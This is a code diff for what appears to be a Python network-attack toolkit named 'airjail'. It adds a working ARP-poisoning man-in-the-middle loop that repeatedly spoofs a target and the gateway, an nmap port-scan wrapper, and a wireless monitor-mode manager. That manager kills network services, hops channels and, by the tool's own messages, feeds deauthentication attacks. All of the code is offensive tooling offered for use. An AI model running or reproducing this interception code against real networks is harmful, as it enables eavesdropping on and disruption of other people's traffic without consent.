@@ -1574,6 +1574,188 @@ def _redirect_off(target_ip):
                     "-p","tcp","!","--dport","80","-j","DROP"],
                    check=False, stderr=subprocess.DEVNULL)
 
+def session_save():
+    """Persist JAILED dict to disk."""
+    try:
+        path = "/var/lib/airjail"
+        os.makedirs(path, exist_ok=True)
+        with open(f"{path}/session.json", "w") as f:
+            json.dump(JAILED, f)
+    except Exception:
+        pass
+
+def session_load():
+    """Restore JAILED dict from disk if it exists."""
+    global JAILED
+    try:
+        with open("/var/lib/airjail/session.json") as f:
+            data = json.load(f)
+        JAILED.update(data)
+    except Exception:
+        pass
+
+def _run_nmap(ip: str):
+    """nmap wrapper — 4 presets + custom. Results in Rich table."""
+    console.print(f"\n[cyan]Port scanning [bold]{ip}[/bold]...[/]\n")
+    presets = [
+        ("-sV -T4 --open -p-",            "Full (65535 ports + version)"),
+        ("-sV -T4 --open --top-ports 1000","Top 1000 + version"),
+        ("-sV -sC -T4 --open -p-",         "Full + NSE scripts"),
+        ("-sU -T4 --top-ports 100",         "Top 100 UDP"),
+    ]
+    for i, (flags, desc) in enumerate(presets, 1):
+        console.print(f"  [bold yellow][{i}][/] {desc}")
+    console.print(f"  [bold yellow][5][/] Custom flags")
+
+    choice = Prompt.ask("[cyan]Preset[/]", default="2").strip()
+    if choice.isdigit() and 1 <= int(choice) <= 4:
+        flags = presets[int(choice)-1][0]
+    elif choice == "5":
+        flags = Prompt.ask("[cyan]nmap flags[/]").strip()
+    else:
+        flags = presets[1][0]
+
+    cmd = ["nmap"] + flags.split() + [ip]
+    console.print(f"[dim]  Running: {' '.join(cmd)}[/]\n")
+    try:
+        out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL, timeout=120)
+    except subprocess.TimeoutExpired:
+        console.print("[red]Scan timed out.[/]"); return
+    except Exception as e:
+        console.print(f"[red]nmap error: {e}[/]"); return
+
+    tbl = Table(title=f"[bold cyan]Ports — {ip}[/]",
+                box=box.ROUNDED, border_style="cyan")
+    tbl.add_column("Port",    style="yellow")
+    tbl.add_column("State",   style="green")
+    tbl.add_column("Service", style="cyan")
+    tbl.add_column("Version", style="dim")
+
+    for line in out.splitlines():
+        m = re.match(r"(\d+/\w+)\s+(\w+)\s+(\S+)(?:\s+(.+))?", line)
+        if m:
+            tbl.add_row(m.group(1), m.group(2), m.group(3), m.group(4) or "")
+
+    console.print(tbl)
+
+def _mitm_stop(ip: str):
+    """Stop an active ARP MITM session and restore ARP tables."""
+    sess = _mitm_sessions.pop(ip, None)
+    if not sess:
+        return
+    sess["stop_ev"].set()
+    if sess.get("thread") and sess["thread"].is_alive():
+        sess["thread"].join(timeout=3)
+    # send gratuitous ARP restore to both sides
+    if SCAPY_OK and GATEWAY_IP and GATEWAY_MAC:
+        try:
+            restore_t = ARP(op=2, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff",
+                            psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
+            restore_g = ARP(op=2, pdst=GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff",
+                            psrc=ip, hwsrc=sess.get("target_mac", "ff:ff:ff:ff:ff:ff"))
+            send(restore_t, count=5, verbose=False, iface=IFACE)
+            send(restore_g, count=5, verbose=False, iface=IFACE)
+        except Exception:
+            pass
+
+def menu_mitm(target_ip: str | None = None):
+    """ARP MITM manager — start/stop sessions."""
+    global GATEWAY_IP, GATEWAY_MAC
+
+    if not SCAPY_OK:
+        console.print("[red]Scapy unavailable — MITM requires Scapy.[/]")
+        input("\nEnter to continue..."); return
+
+    if not GATEWAY_IP:
+        GATEWAY_IP, GATEWAY_MAC = get_gateway()
+
+    # If called from scan menu with a target, go straight to start
+    if target_ip and target_ip not in _mitm_sessions:
+        target_mac = next(
+            (d["mac"] for d in scan_network(silent=True) if d["ip"] == target_ip),
+            "ff:ff:ff:ff:ff:ff"
+        )
+        _mitm_start(target_ip, target_mac)
+        return
+
+    while True:
+        clear(); banner()
+        console.print("[bold yellow]── ARP MITM Manager ──[/]\n")
+
+        if _mitm_sessions:
+            tbl = Table(box=box.ROUNDED, border_style="yellow")
+            tbl.add_column("IP",     style="green")
+            tbl.add_column("Status", style="yellow")
+            for ip_s in _mitm_sessions:
+                tbl.add_row(ip_s, "[yellow]🕵 active[/]")
+            console.print(tbl)
+        else:
+            console.print("[dim]No active MITM sessions.[/]\n")
+
+        console.print(
+            "  [bold yellow][S][/] Start new MITM\n"
+            "  [bold cyan]  [X][/] Stop a MITM session\n"
+            "  [bold dim]   [Q][/] Back\n"
+        )
+        ch = Prompt.ask("[bold yellow]mitm >[/]").upper()
+
+        if ch == "Q":
+            break
+        elif ch == "S":
+            devices = scan_network(silent=True)
+            if devices:
+                tbl2 = Table(box=box.SIMPLE, show_header=False)
+                tbl2.add_column(style="dim", width=4)
+                tbl2.add_column(style="green")
+                tbl2.add_column(style="yellow")
+                for i, d in enumerate(devices, 1):
+                    tbl2.add_row(str(i), d["ip"], d["mac"])
+                console.print(tbl2)
+                idx = Prompt.ask("[cyan]Device # or IP[/]").strip()
+                if idx.isdigit() and 1 <= int(idx) <= len(devices):
+                    t_ip  = devices[int(idx)-1]["ip"]
+                    t_mac = devices[int(idx)-1]["mac"]
+                else:
+                    t_ip  = idx
+                    t_mac = next((d["mac"] for d in devices if d["ip"]==t_ip),
+                                 "ff:ff:ff:ff:ff:ff")
+            else:
+                t_ip  = Prompt.ask("[cyan]Target IP[/]")
+                t_mac = Prompt.ask("[cyan]Target MAC[/]", default="ff:ff:ff:ff:ff:ff")
+            _mitm_start(t_ip, t_mac)
+        elif ch == "X":
+            ip_s = Prompt.ask("[cyan]IP to stop[/]")
+            _mitm_stop(ip_s)
+            console.print(f"[green][✓] MITM stopped for {ip_s}[/]")
+        if ch != "Q":
+            input("\nEnter to continue...")
+
+def _mitm_start(target_ip: str, target_mac: str):
+    """Start ARP poison loop for target_ip ↔ GATEWAY_IP."""
+    if target_ip in _mitm_sessions:
+        console.print(f"[yellow]MITM already active for {target_ip}[/]"); return
+    stop_ev = threading.Event()
+
+    def _loop():
+        while not stop_ev.is_set():
+            try:
+                # target ← "gateway is at our MAC"
+                send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                         psrc=GATEWAY_IP), verbose=False, iface=IFACE)
+                # gateway ← "target is at our MAC"
+                send(ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC,
+                         psrc=target_ip), verbose=False, iface=IFACE)
+            except Exception:
+                pass
+            time.sleep(1.5)
+
+    t = threading.Thread(target=_loop, daemon=True)
+    t.start()
+    _mitm_sessions[target_ip] = {"stop_ev": stop_ev, "thread": t,
+                                  "target_mac": target_mac}
+    LED.mitm_alert()
+    console.print(f"[yellow][✓] MITM started → [bold]{target_ip}[/bold][/]")
+
 def menu_redirect():
     global REDIRECT_IP, JAILED
     while True:
@@ -1741,9 +1923,334 @@ def menu_setup():
     input("Enter to continue...")
 
 
+
 # ══════════════════════════════════════════════════════════════════════════════
-#  SECTION 12 — MAIN MENU
+#  SECTION 11.5 — MONITOR MODE MANAGER
 # ══════════════════════════════════════════════════════════════════════════════
+
+def _iw_get_mode(iface: str) -> str:
+    try:
+        out = subprocess.check_output(["iw","dev",iface,"info"],
+                                      stderr=subprocess.DEVNULL, text=True)
+        m = re.search(r"type (\S+)", out)
+        return m.group(1).lower() if m else "unknown"
+    except Exception:
+        return "unknown"
+
+def _list_wireless_ifaces() -> list:
+    ifaces = []
+    try:
+        out = subprocess.check_output(["iw","dev"],
+                                      stderr=subprocess.DEVNULL, text=True)
+        cur = {}
+        for line in out.splitlines():
+            line = line.strip()
+            if line.startswith("Interface"):
+                if cur: ifaces.append(cur)
+                cur = {"name":line.split()[1],"mode":"unknown",
+                       "addr":"--","ssid":"--","channel":"--"}
+            elif line.startswith("type") and cur:
+                cur["mode"] = line.split()[1].lower()
+            elif line.startswith("addr") and cur:
+                cur["addr"] = line.split()[1]
+            elif line.startswith("ssid") and cur:
+                cur["ssid"] = " ".join(line.split()[1:]) or "--"
+            elif line.startswith("channel") and cur:
+                cur["channel"] = line.split()[1]
+        if cur: ifaces.append(cur)
+    except Exception:
+        pass
+    if not ifaces:
+        for name in os.listdir("/sys/class/net"):
+            if os.path.exists(f"/sys/class/net/{name}/wireless"):
+                ifaces.append({"name":name,"mode":_iw_get_mode(name),
+                               "addr":"--","ssid":"--","channel":"--"})
+    return ifaces
+
+def _kill_interfering() -> list:
+    killed = []
+    for proc in ("wpa_supplicant","NetworkManager","dhclient","dhcpcd"):
+        r = subprocess.run(["pkill","-x",proc],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if r.returncode == 0:
+            killed.append(proc)
+    return killed
+
+def _enable_monitor(iface: str, channel: int = 0):
+    # airmon-ng preferred
+    if shutil.which("airmon-ng"):
+        try:
+            _kill_interfering()
+            args = ["airmon-ng","start",iface]
+            if channel: args.append(str(channel))
+            out = subprocess.check_output(args, stderr=subprocess.STDOUT,
+                                          text=True, timeout=20)
+            m = re.search(r"enabled.+?on\s+\[?phy\d+\]?(\w+)", out, re.IGNORECASE)
+            if m: return m.group(1)
+            mon = iface + "mon"
+            if os.path.exists(f"/sys/class/net/{mon}"): return mon
+        except Exception:
+            pass
+    # iw fallback
+    try:
+        subprocess.run(["ip","link","set",iface,"down"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["iw",iface,"set","type","monitor"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        subprocess.run(["ip","link","set",iface,"up"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if channel:
+            subprocess.run(["iw",iface,"set","channel",str(channel)],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return iface
+    except Exception:
+        return None
+
+def _disable_monitor(iface: str, original_name: str | None = None) -> bool:
+    if shutil.which("airmon-ng"):
+        try:
+            subprocess.run(["airmon-ng","stop",iface],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+            return True
+        except Exception:
+            pass
+    target = original_name or iface
+    try:
+        subprocess.run(["ip","link","set",iface,"down"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["iw",iface,"set","type","managed"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        subprocess.run(["ip","link","set",target,"up"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except Exception:
+        return False
+
+_hop_stop   = threading.Event()
+_hop_thread_ref: list = [None]   # mutable container so lambdas can write it
+
+def _start_hop(iface: str, channels: list | None = None, interval: float = 0.5) -> None:
+    if channels is None:
+        channels = list(range(1,14)) + [36,40,44,48,52,56,60,64]
+    _hop_stop.clear()
+    def _loop():
+        while not _hop_stop.is_set():
+            for ch in channels:
+                if _hop_stop.is_set(): break
+                subprocess.run(["iw",iface,"set","channel",str(ch)],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                _hop_stop.wait(timeout=interval)
+    t = threading.Thread(target=_loop, daemon=True)
+    _hop_thread_ref[0] = t
+    t.start()
+
+def _stop_hop() -> None:
+    _hop_stop.set()
+    t = _hop_thread_ref[0]
+    if t and t.is_alive():
+        t.join(timeout=2)
+    _hop_thread_ref[0] = None
+    _hop_stop.clear()
+
+def _pick_monitor_iface() -> str | None:
+    global MON_IFACE
+    if MONITOR_IFACES:
+        sessions = [(phy, sess["mon_iface"]) for phy, sess in MONITOR_IFACES.items()]
+        if len(sessions) == 1:
+            MON_IFACE = sessions[0][1]
+            return MON_IFACE
+        for i, (phy, mon) in enumerate(sessions, 1):
+            console.print(f"  [{i}] {mon}  (phy: {phy})")
+        ch = Prompt.ask("[cyan]Select #[/]", default="1").strip()
+        if ch.isdigit() and 1 <= int(ch) <= len(sessions):
+            MON_IFACE = sessions[int(ch)-1][1]
+        else:
+            MON_IFACE = sessions[0][1]
+        return MON_IFACE
+    for w in _list_wireless_ifaces():
+        if w["mode"] == "monitor":
+            MON_IFACE = w["name"]
+            return MON_IFACE
+    console.print("[yellow]No monitor interface active. Use [bold][W] Monitor Mode[/bold].[/]")
+    manual = Prompt.ask("[dim]Enter monitor iface manually (blank=cancel)[/]",
+                        default="").strip()
+    if manual: MON_IFACE = manual
+    return manual or None
+
+
+def menu_monitor_mode() -> None:
+    global MON_IFACE
+
+    while True:
+        clear(); banner()
+        console.print("[bold cyan]── Wireless Monitor Mode Manager ──[/]\n")
+
+        ifaces = _list_wireless_ifaces()
+        if not ifaces:
+            console.print("[yellow]No wireless interfaces detected.[/]")
+            input("\nEnter to continue...")
+            return
+
+        tbl = Table(box=box.ROUNDED, border_style="cyan", show_lines=True)
+        tbl.add_column("#",         style="bold yellow", width=4,  justify="right")
+        tbl.add_column("Interface", style="bold cyan",   width=14)
+        tbl.add_column("Mode",      style="bold",        width=12)
+        tbl.add_column("MAC",       style="yellow",      width=20)
+        tbl.add_column("SSID",      style="green",       width=18)
+        tbl.add_column("Ch",        style="magenta",     width=5)
+        tbl.add_column("Tracked",   style="dim",         width=8)
+
+        for i, w in enumerate(ifaces, 1):
+            mfmt = ("[bold green]monitor[/]" if w["mode"] == "monitor" else
+                    "[cyan]managed[/]"        if w["mode"] == "managed"  else
+                    f"[dim]{w['mode']}[/]")
+            tracked = ""
+            for phy, sess in MONITOR_IFACES.items():
+                if sess.get("mon_iface") == w["name"] or phy == w["name"]:
+                    tracked = "[green]✓[/]"
+            name_s = (f"[bold green]{w['name']} ◄[/]"
+                      if w["name"] == MON_IFACE else w["name"])
+            tbl.add_row(str(i), name_s, mfmt,
+                        w["addr"], w["ssid"], w["channel"], tracked)
+
+        console.print(tbl)
+
+        if MON_IFACE:
+            console.print(f"\n[green]Active monitor → [bold]{MON_IFACE}[/bold][/]  "
+                          f"[dim](auto-used by deauth & scan)[/]")
+
+        opt = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
+        opt.add_column(style="bold yellow", width=4)
+        opt.add_column(style="bold",        width=28)
+        opt.add_column(style="dim",         width=40)
+        opt.add_row("[M]", "Enable Monitor Mode",    "Select adapter → monitor mode")
+        opt.add_row("[S]", "Stop Monitor Mode",      "Return adapter to managed mode")
+        opt.add_row("[H]", "Start Channel Hopping",  "Background hop across channels")
+        opt.add_row("[X]", "Stop Channel Hopping",   "Stop the hopper")
+        opt.add_row("[K]", "Kill Interfering Procs", "pkill wpa_supplicant/NM/dhclient")
+        opt.add_row("[R]", "Refresh",                "Re-list interfaces")
+        opt.add_row("[Q]", "Back",                   "")
+        console.print(opt)
+
+        ch = Prompt.ask("\n[bold cyan]monitor >[/]").strip().upper()
+
+        if ch == "Q":
+            break
+
+        elif ch == "R":
+            continue
+
+        elif ch == "K":
+            killed = _kill_interfering()
+            console.print(f"[green]Killed: {', '.join(killed)}[/]"
+                          if killed else "[dim]Nothing to kill.[/]")
+
+        elif ch == "M":
+            for i, w in enumerate(ifaces, 1):
+                console.print(f"  [{i}] {w['name']}  [{w['mode']}]")
+            sel = Prompt.ask("[cyan]Interface #[/]").strip()
+            if not sel.isdigit() or not (1 <= int(sel) <= len(ifaces)):
+                console.print("[red]Invalid.[/]"); input("\nEnter..."); continue
+            target = ifaces[int(sel)-1]["name"]
+            ch_num = Prompt.ask("[cyan]Channel (0=any)[/]", default="0").strip()
+            try: ch_num = int(ch_num)
+            except ValueError: ch_num = 0
+
+            with console.status(f"[cyan]Enabling monitor on {target}..."):
+                mon = _enable_monitor(target, channel=ch_num)
+
+            if mon:
+                MONITOR_IFACES[target] = {
+                    "mon_iface": mon,
+                    "method":    "airmon-ng" if shutil.which("airmon-ng") else "iw",
+                    "started":   datetime.now().strftime("%H:%M:%S")
+                }
+                MON_IFACE = mon
+                LED.monitor_start()
+                console.print(
+                    f"\n[green][✓] Monitor mode → [bold]{mon}[/bold][/]\n"
+                    f"[dim]  Deauth & post-scan actions will use this automatically.[/]"
+                )
+            else:
+                LED.error()
+                console.print(
+                    f"[red][✗] Failed. Try:[/]\n"
+                    f"[dim]  sudo airmon-ng check kill && "
+                    f"sudo airmon-ng start {target}[/]"
+                )
+
+        elif ch == "S":
+            if not MONITOR_IFACES:
+                # show external monitor ifaces
+                ext = [w for w in ifaces if w["mode"] == "monitor"]
+                if ext:
+                    for i, w in enumerate(ext, 1):
+                        console.print(f"  [{i}] {w['name']}")
+                    sel = Prompt.ask("[cyan]Stop # (blank=skip)[/]", default="").strip()
+                    if sel.isdigit() and 1 <= int(sel) <= len(ext):
+                        mi = ext[int(sel)-1]["name"]
+                        if _disable_monitor(mi):
+                            if MON_IFACE == mi: MON_IFACE = None
+                            console.print(f"[green][✓] {mi} → managed.[/]")
+                        else:
+                            console.print(f"[red][✗] Failed.[/]")
+                else:
+                    console.print("[dim]No active airjail monitor sessions.[/]")
+                input("\nEnter..."); continue
+
+            tracked = list(MONITOR_IFACES.items())
+            for i, (phy, sess) in enumerate(tracked, 1):
+                console.print(f"  [{i}] {sess['mon_iface']}  (phy:{phy}, via {sess['method']})")
+            sel = Prompt.ask("[cyan]Select # (0=all)[/]").strip()
+            if sel == "0":
+                targets = tracked[:]
+            elif sel.isdigit() and 1 <= int(sel) <= len(tracked):
+                targets = [tracked[int(sel)-1]]
+            else:
+                console.print("[red]Invalid.[/]"); input("\nEnter..."); continue
+
+            for phy, sess in targets:
+                mon = sess.get("mon_iface", phy)
+                with console.status(f"[cyan]Stopping {mon}..."):
+                    ok = _disable_monitor(mon, original_name=phy)
+                MONITOR_IFACES.pop(phy, None)
+                if ok:
+                    if MON_IFACE == mon: MON_IFACE = None
+                    console.print(f"[green][✓] {mon} → managed.[/]")
+                else:
+                    console.print(
+                        f"[yellow][!] Manual restore:\n"
+                        f"  sudo ip link set {phy} down && "
+                        f"sudo iw {phy} set type managed && "
+                        f"sudo ip link set {phy} up[/]"
+                    )
+            if not MONITOR_IFACES:
+                _stop_hop()
+                LED.monitor_stop()
+
+        elif ch == "H":
+            if not MON_IFACE:
+                console.print("[red]Enable monitor mode first.[/]")
+            else:
+                band = Prompt.ask("[cyan]Bands (2.4/5/all)[/]", default="all").lower()
+                if band == "2.4":   chans = list(range(1,14))
+                elif band == "5":   chans = [36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140]
+                else:               chans = list(range(1,14)) + [36,40,44,48,52,56,60,64]
+                ivl = float(Prompt.ask("[cyan]Interval (sec)[/]", default="0.5"))
+                _stop_hop()
+                _start_hop(MON_IFACE, chans, ivl)
+                console.print(f"[green][✓] Hopping {len(chans)} channels on {MON_IFACE} every {ivl}s[/]")
+
+        elif ch == "X":
+            _stop_hop()
+            console.print("[green][✓] Hopper stopped.[/]")
+
+        else:
+            console.print("[dim]Unknown option.[/]")
+
+        if ch not in ("Q", "R"):
+            input("\nEnter to continue...")
+
 
 def main_menu():
     clear(); banner()
@@ -1850,10 +2357,9 @@ def run():
             for ip in list(_mitm_sessions.keys()):
                 _mitm_stop(ip)
             # stop all monitor mode sessions
-            for phy, sess in list(MONITOR_IFACES.items()):
-                mon = sess.get("mon_iface", phy)
+            for mon, orig in list(_mon_ifaces.items()):
                 _disable_monitor(mon)
-                MONITOR_IFACES.pop(phy, None)
+            _stop_hop()
             LED.monitor_stop()
             LED.off()
             for ev in _stop_events.values(): ev.set()
